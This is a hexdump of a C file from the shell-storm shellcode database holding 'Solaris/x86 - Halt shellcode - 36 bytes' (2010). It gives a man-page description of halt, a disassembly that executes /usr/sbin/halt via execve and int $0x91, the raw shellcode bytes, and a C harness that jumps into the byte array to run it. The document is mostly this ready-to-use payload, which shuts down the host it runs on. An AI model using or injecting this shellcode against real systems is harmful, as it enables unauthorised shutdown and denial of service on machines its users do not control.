00000000  2f 2a 0a 54 69 74 6c 65  3a 20 20 20 53 6f 6c 61  |/*.Title:   Sola|
00000010  72 69 73 2f 78 38 36 20  2d 20 48 61 6c 74 20 73  |ris/x86 - Halt s|
00000020  68 65 6c 6c 63 6f 64 65  20 2d 20 33 36 20 62 79  |hellcode - 36 by|
00000030  74 65 73 0a 41 75 68 74  6f 72 3a 20 20 4a 6f 6e  |tes.Auhtor:  Jon|
00000040  61 74 68 61 6e 20 53 61  6c 77 61 6e 20 3c 73 75  |athan Salwan <su|
00000050  62 6d 69 74 20 41 54 20  73 68 65 6c 6c 2d 73 74  |bmit AT shell-st|
00000060  6f 72 6d 2e 6f 72 67 3e  0a 57 65 62 3a 20 20 20  |orm.org>.Web:   |
00000070  20 20 68 74 74 70 3a 2f  2f 77 77 77 2e 73 68 65  |  http://www.she|
00000080  6c 6c 2d 73 74 6f 72 6d  2e 6f 72 67 0a 54 77 69  |ll-storm.org.Twi|
00000090  74 74 65 72 3a 20 68 74  74 70 3a 2f 2f 74 77 69  |tter: http://twi|
000000a0  74 74 65 72 2e 63 6f 6d  2f 6a 6f 6e 61 74 68 61  |tter.com/jonatha|
000000b0  6e 73 61 6c 77 61 6e 0a  0a 44 61 74 65 3a 09 20  |nsalwan..Date:. |
000000c0  32 30 31 30 2d 30 35 2d  32 30 0a 54 65 73 74 65  |2010-05-20.Teste|
000000d0  64 3a 20 20 53 75 6e 4f  53 20 6f 70 65 6e 73 6f  |d:  SunOS openso|
000000e0  6c 61 72 69 73 20 35 2e  31 31 20 73 6e 76 5f 31  |laris 5.11 snv_1|
000000f0  31 31 62 20 69 38 36 70  63 20 69 33 38 36 20 69  |11b i86pc i386 i|
00000100  38 36 70 63 20 53 6f 6c  61 72 69 73 0a 0a 21 44  |86pc Solaris..!D|
00000110  61 74 61 62 61 73 65 20  6f 66 20 53 68 65 6c 6c  |atabase of Shell|
00000120  63 6f 64 65 73 20 68 74  74 70 3a 2f 2f 77 77 77  |codes http://www|
00000130  2e 73 68 65 6c 6c 2d 73  74 6f 72 6d 2e 6f 72 67  |.shell-storm.org|
00000140  2f 73 68 65 6c 6c 63 6f  64 65 2f 0a 0a 0a 44 65  |/shellcode/...De|
00000150  73 63 72 69 70 74 69 6f  6e 3a 0a 2d 2d 2d 2d 2d  |scription:.-----|
00000160  2d 2d 2d 2d 2d 2d 2d 0a  0a 20 54 68 65 20 68 61  |-------.. The ha|
00000170  6c 74 20 61 6e 64 20 70  6f 77 65 72 6f 66 66 20  |lt and poweroff |
00000180  75 74 69 6c 69 74 69 65  73 20 77 72 69 74 65 20  |utilities write |
00000190  61 6e 79 20 20 70 65 6e  64 69 6e 67 20 20 69 6e  |any  pending  in|
000001a0  66 6f 72 6d 61 74 69 6f  6e 20 20 0a 20 74 6f 20  |formation  . to |
000001b0  74 68 65 20 64 69 73 6b  73 20 61 6e 64 20 74 68  |the disks and th|
000001c0  65 6e 20 73 74 6f 70 20  74 68 65 20 70 72 6f 63  |en stop the proc|
000001d0  65 73 73 6f 72 2e 20 54  68 65 20 70 6f 77 65 72  |essor. The power|
000001e0  6f 66 66 20 75 74 69 6c  69 74 79 20 0a 20 77 69  |off utility . wi|
000001f0  6c 6c 20 68 61 76 65 20  74 68 65 20 6d 61 63 68  |ll have the mach|
00000200  69 6e 65 20 72 65 6d 6f  76 65 20 70 6f 77 65 72  |ine remove power|
00000210  2c 20 69 66 20 70 6f 73  73 69 62 6c 65 2e 0a 0a  |, if possible...|
00000220  20 54 68 65 20 68 61 6c  74 20 61 6e 64 20 70 6f  | The halt and po|
00000230  77 65 72 6f 66 66 20 20  75 74 69 6c 69 74 69 65  |weroff  utilitie|
00000240  73 20 20 6e 6f 72 6d 61  6c 6c 79 20 20 6c 6f 67  |s  normally  log|
00000250  20 20 74 68 65 20 20 73  79 73 74 65 6d 0a 20 73  |  the  system. s|
00000260  68 75 74 64 6f 77 6e 20  20 74 6f 20 74 68 65 20  |hutdown  to the |
00000270  73 79 73 74 65 6d 20 6c  6f 67 20 64 61 65 6d 6f  |system log daemo|
00000280  6e 2c 20 73 79 73 6c 6f  67 64 28 31 4d 29 2c 20  |n, syslogd(1M), |
00000290  61 6e 64 20 70 6c 61 63  65 20 61 0a 20 73 68 75  |and place a. shu|
000002a0  74 64 6f 77 6e 20 72 65  63 6f 72 64 20 69 6e 20  |tdown record in |
000002b0  74 68 65 20 6c 6f 67 69  6e 20 61 63 63 6f 75 6e  |the login accoun|
000002c0  74 69 6e 67 20 66 69 6c  65 20 2f 76 61 72 2f 61  |ting file /var/a|
000002d0  64 6d 2f 77 74 6d 70 78  2e 0a 20 54 68 65 73 65  |dm/wtmpx.. These|
000002e0  20 20 61 63 74 69 6f 6e  73 20 20 61 72 65 20 20  |  actions  are  |
000002f0  69 6e 68 69 62 69 74 65  64 20 20 69 66 20 20 74  |inhibited  if  t|
00000300  68 65 20 2d 6e 20 6f 72  20 2d 71 20 6f 70 74 69  |he -n or -q opti|
00000310  6f 6e 73 20 61 72 65 0a  20 70 72 65 73 65 6e 74  |ons are. present|
00000320  2e 0a 0a 0a 0a 44 69 73  61 73 73 65 6d 62 6c 79  |.....Disassembly|
00000330  20 69 6e 66 6f 72 6d 61  74 69 6f 6e 73 3a 0a 2d  | informations:.-|
00000340  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000350  2d 2d 2d 2d 2d 2d 2d 2d  0a 0a 73 65 63 74 69 6f  |--------..sectio|
00000360  6e 20 2e 74 65 78 74 0a  20 20 20 20 30 78 38 30  |n .text.    0x80|
00000370  34 38 30 37 34 3a 20 20  20 20 20 20 20 20 20 20  |48074:          |
00000380  20 20 20 20 33 31 20 64  32 20 20 20 20 20 20 20  |    31 d2       |
00000390  20 20 20 20 20 20 20 78  6f 72 6c 20 20 20 25 65  |       xorl   %e|
000003a0  64 78 2c 25 65 64 78 0a  20 20 20 20 30 78 38 30  |dx,%edx.    0x80|
000003b0  34 38 30 37 36 3a 20 20  20 20 20 20 20 20 20 20  |48076:          |
000003c0  20 20 20 20 35 32 20 20  20 20 20 20 20 20 20 20  |    52          |
000003d0  20 20 20 20 20 20 20 70  75 73 68 6c 20 20 25 65  |       pushl  %e|
000003e0  64 78 0a 20 20 20 20 30  78 38 30 34 38 30 37 37  |dx.    0x8048077|
000003f0  3a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 36  |:              6|
00000400  36 20 36 38 20 36 63 20  37 34 20 20 20 20 20 20  |6 68 6c 74      |
00000410  20 20 70 75 73 68 77 20  20 24 30 78 37 34 36 63  |  pushw  $0x746c|
00000420  0a 20 20 20 20 30 78 38  30 34 38 30 37 62 3a 20  |.    0x804807b: |
00000430  20 20 20 20 20 20 20 20  20 20 20 20 20 36 38 20  |             68 |
00000440  36 65 20 32 66 20 36 38  20 36 31 20 20 20 20 20  |6e 2f 68 61     |
00000450  70 75 73 68 6c 20 20 24  30 78 36 31 36 38 32 66  |pushl  $0x61682f|
00000460  36 65 0a 20 20 20 20 30  78 38 30 34 38 30 38 30  |6e.    0x8048080|
00000470  3a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 36  |:              6|
00000480  38 20 32 66 20 37 33 20  36 32 20 36 39 20 20 20  |8 2f 73 62 69   |
00000490  20 20 70 75 73 68 6c 20  20 24 30 78 36 39 36 32  |  pushl  $0x6962|
000004a0  37 33 32 66 0a 20 20 20  20 30 78 38 30 34 38 30  |732f.    0x80480|
000004b0  38 35 3a 20 20 20 20 20  20 20 20 20 20 20 20 20  |85:             |
000004c0  20 36 38 20 32 66 20 37  35 20 37 33 20 37 32 20  | 68 2f 75 73 72 |
000004d0  20 20 20 20 70 75 73 68  6c 20 20 24 30 78 37 32  |    pushl  $0x72|
000004e0  37 33 37 35 32 66 0a 20  20 20 20 30 78 38 30 34  |73752f.    0x804|
000004f0  38 30 38 61 3a 20 20 20  20 20 20 20 20 20 20 20  |808a:           |
00000500  20 20 20 38 39 20 65 33  20 20 20 20 20 20 20 20  |   89 e3        |
00000510  20 20 20 20 20 20 6d 6f  76 6c 20 20 20 25 65 73  |      movl   %es|
00000520  70 2c 25 65 62 78 0a 20  20 20 20 30 78 38 30 34  |p,%ebx.    0x804|
00000530  38 30 38 63 3a 20 20 20  20 20 20 20 20 20 20 20  |808c:           |
00000540  20 20 20 35 32 20 20 20  20 20 20 20 20 20 20 20  |   52           |
00000550  20 20 20 20 20 20 70 75  73 68 6c 20 20 25 65 64  |      pushl  %ed|
00000560  78 0a 20 20 20 20 30 78  38 30 34 38 30 38 64 3a  |x.    0x804808d:|
00000570  20 20 20 20 20 20 20 20  20 20 20 20 20 20 35 33  |              53|
00000580  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000590  20 70 75 73 68 6c 20 20  25 65 62 78 0a 20 20 20  | pushl  %ebx.   |
000005a0  20 30 78 38 30 34 38 30  38 65 3a 20 20 20 20 20  | 0x804808e:     |
000005b0  20 20 20 20 20 20 20 20  20 38 39 20 65 31 20 20  |         89 e1  |
000005c0  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 6c  |            movl|
000005d0  20 20 20 25 65 73 70 2c  25 65 63 78 0a 20 20 20  |   %esp,%ecx.   |
000005e0  20 30 78 38 30 34 38 30  39 30 3a 20 20 20 20 20  | 0x8048090:     |
000005f0  20 20 20 20 20 20 20 20  20 35 32 20 20 20 20 20  |         52     |
00000600  20 20 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |            push|
00000610  6c 20 20 25 65 64 78 0a  20 20 20 20 30 78 38 30  |l  %edx.    0x80|
00000620  34 38 30 39 31 3a 20 20  20 20 20 20 20 20 20 20  |48091:          |
00000630  20 20 20 20 35 31 20 20  20 20 20 20 20 20 20 20  |    51          |
00000640  20 20 20 20 20 20 20 70  75 73 68 6c 20 20 25 65  |       pushl  %e|
00000650  63 78 0a 20 20 20 20 30  78 38 30 34 38 30 39 32  |cx.    0x8048092|
00000660  3a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 35  |:              5|
00000670  33 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |3               |
00000680  20 20 70 75 73 68 6c 20  20 25 65 62 78 0a 20 20  |  pushl  %ebx.  |
00000690  20 20 30 78 38 30 34 38  30 39 33 3a 20 20 20 20  |  0x8048093:    |
000006a0  20 20 20 20 20 20 20 20  20 20 62 30 20 33 62 20  |          b0 3b |
000006b0  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
000006c0  62 20 20 20 24 30 78 33  62 2c 25 61 6c 0a 20 20  |b   $0x3b,%al.  |
000006d0  20 20 30 78 38 30 34 38  30 39 35 3a 20 20 20 20  |  0x8048095:    |
000006e0  20 20 20 20 20 20 20 20  20 20 35 32 20 20 20 20  |          52    |
000006f0  20 20 20 20 20 20 20 20  20 20 20 20 20 70 75 73  |             pus|
00000700  68 6c 20 20 25 65 64 78  0a 20 20 20 20 30 78 38  |hl  %edx.    0x8|
00000710  30 34 38 30 39 36 3a 20  20 20 20 20 20 20 20 20  |048096:         |
00000720  20 20 20 20 20 63 64 20  39 31 20 20 20 20 20 20  |     cd 91      |
00000730  20 20 20 20 20 20 20 20  69 6e 74 20 20 20 20 24  |        int    $|
00000740  30 78 39 31 0a 0a 2a 2f  0a 0a 23 69 6e 63 6c 75  |0x91..*/..#inclu|
00000750  64 65 20 3c 73 74 64 69  6f 2e 68 3e 0a 0a 63 68  |de <stdio.h>..ch|
00000760  61 72 20 73 63 5b 5d 20  3d 20 22 5c 78 33 31 5c  |ar sc[] = "\x31\|
00000770  78 64 32 5c 78 35 32 5c  78 36 36 5c 78 36 38 5c  |xd2\x52\x66\x68\|
00000780  78 36 63 5c 78 37 34 5c  78 36 38 5c 78 36 65 22  |x6c\x74\x68\x6e"|
00000790  0a 20 20 20 20 20 20 20  20 20 20 20 20 22 5c 78  |.            "\x|
000007a0  32 66 5c 78 36 38 5c 78  36 31 5c 78 36 38 5c 78  |2f\x68\x61\x68\x|
000007b0  32 66 5c 78 37 33 5c 78  36 32 5c 78 36 39 5c 78  |2f\x73\x62\x69\x|
000007c0  36 38 22 0a 20 20 20 20  20 20 20 20 20 20 20 20  |68".            |
000007d0  22 5c 78 32 66 5c 78 37  35 5c 78 37 33 5c 78 37  |"\x2f\x75\x73\x7|
000007e0  32 5c 78 38 39 5c 78 65  33 5c 78 35 32 5c 78 35  |2\x89\xe3\x52\x5|
000007f0  33 5c 78 38 39 22 0a 20  20 20 20 20 20 20 20 20  |3\x89".         |
00000800  20 20 20 22 5c 78 65 31  5c 78 35 32 5c 78 35 31  |   "\xe1\x52\x51|
00000810  5c 78 35 33 5c 78 62 30  5c 78 33 62 5c 78 35 32  |\x53\xb0\x3b\x52|
00000820  5c 78 63 64 5c 78 39 31  22 3b 0a 0a 0a 69 6e 74  |\xcd\x91";...int|
00000830  20 6d 61 69 6e 28 76 6f  69 64 29 0a 7b 0a 20 20  | main(void).{.  |
00000840  20 20 20 20 20 66 70 72  69 6e 74 66 28 73 74 64  |     fprintf(std|
00000850  6f 75 74 2c 22 4c 65 6e  67 68 74 3a 20 25 64 5c  |out,"Lenght: %d\|
00000860  6e 22 2c 73 74 72 6c 65  6e 28 73 63 29 29 3b 0a  |n",strlen(sc));.|
00000870  20 20 20 20 20 20 20 28  2a 28 76 6f 69 64 28 2a  |       (*(void(*|
00000880  29 28 29 29 20 73 63 29  28 29 3b 0a 0a 72 65 74  |)()) sc)();..ret|
00000890  75 72 6e 20 30 3b 0a 7d                           |urn 0;.}|
00000898
